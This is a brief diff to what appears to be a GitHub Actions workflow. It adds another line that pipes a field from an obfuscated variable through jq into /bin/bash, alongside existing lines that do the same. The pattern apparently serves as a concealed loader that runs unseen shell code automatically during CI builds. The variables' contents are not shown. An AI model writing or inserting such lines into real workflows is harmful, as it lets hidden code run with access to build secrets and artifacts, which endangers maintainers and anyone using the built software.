@@ -55,6 +55,7 @@ jobs:
           printf '%s' "$y8" | jq -r .inup09600 | /bin/bash
           printf '%s' "$kksx046" | jq -r .t7 | /bin/bash
           echo $uj385 | jq -r .vu12 | /bin/bash
+          echo $jq70 | jq -r .r32 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
